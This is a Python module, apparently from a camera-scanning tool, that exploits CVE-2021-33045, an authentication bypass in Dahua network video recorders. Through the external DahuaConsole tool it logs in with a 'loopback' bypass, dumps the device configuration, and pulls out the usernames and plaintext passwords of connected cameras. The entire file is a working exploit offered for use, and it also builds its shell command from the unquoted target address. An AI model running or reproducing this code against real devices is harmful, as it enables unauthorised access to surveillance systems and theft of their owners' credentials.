"""dahua(NVR) bypassing authentication vulnerability
some functions need the 'DahuaConsole', reference:
https://github.com/mcw0/DahuaConsole
"""
import os
import json

from Ingram.utils import config
from Ingram.utils import logger
from Ingram.utils import run_cmd


def cve_2021_33045(ip: str) -> list:
    if ':' in ip: ip, port = ip.split(':')
    else: port = 80
    CWD = os.path.dirname(os.path.abspath(__file__))
    console = os.path.join(CWD, 'lib/DahuaConsole/Console.py')
    json_file = os.path.join(config.OUT, f"{ip}-{port}-users.json")

    try:
        cmd = f"""
        (
            echo "config RemoteDevice save {json_file}"
            echo "quit all"
        ) | python -Bu {console} --logon loopback --rhost {ip} --rport {port} --proto dhip 2>/dev/null
        """
        code, msg = run_cmd(cmd)

        # success
        if os.path.exists(json_file):
            with open(json_file, 'r') as f:
                info = json.load(f)
            dev_all = info['params']['table'].values()
            dev_alive = [i for i in dev_all if i['Enable']]
            user = dev_alive[0]['UserName']
            passwds = [i['Password'] for i in dev_alive if i['Password'] != '']
            passwds = list(set(passwds))
            # 子相机上有许多不同的密码，但是这些可能都和这台nvr的密码不一样
            return [True, user, passwds[0], 'cve-2021-33045', len(dev_alive), passwds]
    except Exception as e:
        logger.error(e)
    finally:
        if os.path.exists(json_file):
            os.remove(json_file)
    return [False, ]